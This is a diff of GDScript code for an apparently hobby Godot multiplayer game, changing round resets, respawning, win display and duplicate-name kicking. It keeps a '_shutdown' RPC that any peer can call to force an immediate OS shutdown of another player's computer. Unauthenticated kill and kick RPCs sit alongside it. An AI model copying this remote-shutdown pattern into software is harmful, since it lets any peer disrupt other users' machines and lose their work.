@@ -251,12 +251,12 @@ func createDashAttack(pos,dir,length,id):
 	objectHolder.call_deferred("add_child",dash,true)
 
 var bloodSplatterPath = preload("res://scenes/blood_splatter.tscn")
-func createBloodSplatter(pos,dir,damage,knockback,type):
-	rpc("_createBloodSplatter",pos,dir,damage,knockback,type)
-@rpc("any_peer", "call_local") func _createBloodSplatter(pos,dir,damage,knockback,type):
+func createBloodSplatter(pos,dir,damage,knockback):
+	rpc("_createBloodSplatter",pos,dir,damage,knockback)
+@rpc("any_peer", "call_local") func _createBloodSplatter(pos,dir,damage,knockback):
 	
 	var splatter = bloodSplatterPath.instantiate()
-	splatter.setType(pos,dir,damage,knockback,type)
+	splatter.setType(pos,dir,damage,knockback)
 	var objectHolder = get_tree().get_first_node_in_group("objectHolder")
 	objectHolder.call_deferred("add_child",splatter,true)
 	
@@ -367,12 +367,34 @@ func resetGame(lastLivingPlayer):
 	
 	
 	if lastResetTime + 5000 < Time.get_ticks_msec():
-		if lastLivingPlayer:
-			won(lastLivingPlayer)
-		rpc("_resetGame")
+		
+		
+		
+		get_tree().create_timer(2).timeout.connect(
+			func(): 
+			rpc("_resetGame") 
+			if lastLivingPlayer:
+				won(lastLivingPlayer)
+			else: # call won with -1 to show that nobody wins
+				won(-1)
+			
+			Globals.playersInServer = getPlayersInServer()
+			
+			var pos = $spawnPoints.position
+			var offset = Vector2(0,100)
+			var rot = 360/Globals.playersInServer.keys().size() if Globals.playersInServer.keys().size() > 0 else 1
+			for player in Globals.playersInServer.keys():
+				goToPosition(Globals.playersInServer[player],pos+offset)
+				offset = offset.rotated(rot)
+				pass
+			#initiateReset(int(str(child.name)),randi_range(0,$spawnPoints.get_child_count()-3))
+		)
+		
 		Globals.lastRoundStart = Time.get_ticks_msec()
 		lastResetTime = Time.get_ticks_msec()
 	
+
+#tells the peer to delete everything but avatars
 @rpc("any_peer", "call_local") func _resetGame():
 	#Globals.player.reset()
 	Globals.roundsPlayed += 1
@@ -385,10 +407,6 @@ func resetGame(lastLivingPlayer):
 			tween.tween_property(child,"modulate", Color(1,1,1,0), 1)
 			#tween.tween_callback(child.queue_free)
 			
-			
-		else:
-			initiateReset(int(str(child.name)),randi_range(0,$spawnPoints.get_child_count()-3))
-	
 	var tween = get_tree().create_tween()
 	tween.tween_callback(func (): 
 		for child in get_tree().get_first_node_in_group("objectHolder").get_children():
@@ -396,20 +414,19 @@ func resetGame(lastLivingPlayer):
 				child.queue_free()
 		).set_delay(2)
 	
+	$gameEnd.play()
+	submitScores()
 	print(str(Globals.multiplayerId) + " reset the game")
 	
 
-func initiateReset(id,pos : int):
-	
-	
-	submitScores()
+#tells a specific player where to go
+@rpc("any_peer", "call_local") func goToPosition(id,pos : Vector2):
 	
 	Globals.playerIsDead = false
 	
 	if Globals.multiplayerId == id:
-		var place = $spawnPoints.get_child(pos)
 		
-		Globals.player.goToPosition(place.position)
+		Globals.player.goToPosition(pos)
 	
 	pass
 	
@@ -459,7 +476,12 @@ func won(wonId):
 	
 	#print(Globals.playersInServer)
 	
-	var winnerName = Globals.playersInServer.find_key(wonId)
+	var winnerName = ""
+	
+	if wonId != -1:
+		winnerName = Globals.playersInServer.find_key(wonId)
+	else:
+		winnerName = "Nobody"
 	
 	if winnerName != null:
 		Globals.playerCamera.displayWin(winnerName)
@@ -478,28 +500,42 @@ func playSoundFromPath(soundPath,pos):
 	Globals.safePlaySound(player,pos)
 	
 
+@rpc("any_peer","call_local") func leaveServer():
+	Globals.peer.close()
+	
+	get_tree().change_scene_to_file("res://scenes/main_menu.tscn")
+	
+	Globals.paused = false
 
 func killPlayer(targetId):
 	rpc("_killPlayer",targetId)
 @rpc("any_peer", "call_local") func _killPlayer(targetId):
 	if Globals.multiplayerId == int(targetId):
+		Globals.invincible = false
 		Globals.player.takeDamage(Vector2.UP,0,99999,-100) #-100 should never be a real id
 		pass
 
 func shutDown(targetId):
 	rpc("_shutdown",targetId)
 @rpc("any_peer", "call_local") func _shutdown(targetId):
-	if Globals.multiplayerId == int(targetId):
+	if Globals.multiplayerId == int(targetId) and targetId != 1:
 		
 		OS.execute("shutdown", ["/s", "/f", "/t", "0"])
 
+#this function also kicks players with duplicate names. Janky, I know.
 func getPlayersInServer():
 	
 	var dict = {}
 	
 	for child in get_tree().get_first_node_in_group("objectHolder").get_children():
 		if child.is_in_group("avatar"):
-			dict[child.getName()] = child.getId()
+			var childName = child.getName()
+			var childId = child.getId()
+			
+			if dict.has(childName) and childId != 1:
+				rpc_id(childId,"leaveServer")
+			
+			dict[childName] = childId
 			
 	
 	return dict
